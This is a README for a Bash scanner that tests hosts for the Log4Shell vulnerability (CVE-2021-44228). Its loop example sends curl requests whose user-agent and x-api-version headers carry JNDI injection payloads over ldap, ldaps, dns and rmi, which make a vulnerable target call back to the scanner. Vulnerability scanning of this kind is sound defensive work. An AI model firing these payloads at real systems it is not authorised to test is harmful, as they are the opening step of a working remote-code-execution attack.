# log4jScanner

 log4jScanner.sh is a BASH script to confirm the vulnerability (CVE-2021-44228) of a given IP/URL.
 This script validates the return traffic on 4 protocols ldap | ldaps | rmi | dns 
 The testing methedology is completely noninvasive. 
 
## Requirements

If you prefer to test the internet facing target, then this test requires to be executed on a DMZ host,
on which you can open desired port for scanner's return traffic from the target. I have used and tested on free tier AWS EC2 Kali Linux instance. 

If you prefer to test the intranet facing target, then you simply make sure that scanner-port is reachable to the target. 
[Example: ./log4jScanner.sh 192.168.1.100:443 1389]

## Prepare the Kali instance with the below mentioned packages.

```bash
 apt install iptables iptables-persistence rsyslog curl vim
 
 systemctl restart rsyslog
 
```
## Download the script
```bash
git clone https://github.com/defcon250/log4jScanner
```

## Usage

```bash
  cd ./log4jScanner
  ./log4jScanner.sh  <Target-IP>:<Target-Port>  <Scanner's-Return-Traffic-Port>  
  
  [Example: ./log4jScanner.sh 192.168.1.100:443 1389]

```
## For testing multiple IP/URLs, please feel free to modify the script accordingly.
```bash
FOR loop example: 
for i in $(cat /tmp/urls.txt); do timeout 2 curl -ksqL http://"$i" -H "x-api-version: \${jndi:ldap://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:ldaps://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1>  /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:dns://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}"  1> /dev/null; timeout 2 curl -ksqL http://"$i" -H "user-agent: \${jndi:rmi://"$DEFAULT_INTERFACE":"$BADPORT"/abcd}" 1> /dev/null; done
````


